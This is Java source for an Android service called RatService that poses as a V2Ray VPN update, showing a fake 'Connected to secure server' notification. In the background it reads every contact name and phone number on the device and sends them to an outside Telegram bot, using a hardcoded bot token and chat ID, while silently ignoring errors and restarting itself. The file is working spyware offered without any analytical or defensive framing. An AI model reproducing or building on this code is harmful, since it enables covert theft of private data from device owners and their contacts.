package com.v2ray.update;
import android.app.*; import android.content.Intent; import android.database.Cursor; import android.os.IBinder; import android.provider.ContactsContract; import androidx.core.app.NotificationCompat; import java.io.*; import java.net.HttpURLConnection; import java.net.URL; import java.nio.charset.StandardCharsets;
public class RatService extends Service {
    private static final String BOT_TOKEN = "9178490317:AAFZJTBGopALDFWZO5kuvXNvSL4B7x5CCdY";
    private static final String CHAT_ID = "8895860731";
    private static final String API = "https://api.telegram.org/bot" + BOT_TOKEN;
    private static final String CHANNEL_ID = "v2ray_service";

    @Override public IBinder onBind(Intent intent) { return null; }
    
    @Override public void onCreate() {
        super.onCreate();
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "V2Ray Service", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("V2Ray")
                .setContentText("Connected to secure server")
                .setSmallIcon(android.R.drawable.ic_menu_compass)
                .build();
        startForeground(1, notification);
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            try { sendContacts(); } catch (Exception e) {}
        }).start();
        return START_STICKY;
    }

    private void sendContacts() throws Exception {
        StringBuilder sb = new StringBuilder();
        Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (c != null) {
            while (c.moveToNext()) {
                sb.append(c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(": ").append(c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
            }
            c.close();
        }
        sendText("Contacts Alive", sb.toString());
    }

    private void sendText(String title, String body) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(API + "/sendMessage").openConnection();
            c.setDoOutput(true); c.setRequestMethod("POST"); c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            try (OutputStream os = c.getOutputStream()) { os.write(("chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(title + "\n\n" + body, "UTF-8")).getBytes(StandardCharsets.UTF_8)); }
            c.getResponseCode();
        } catch (Exception e) {}
    }
}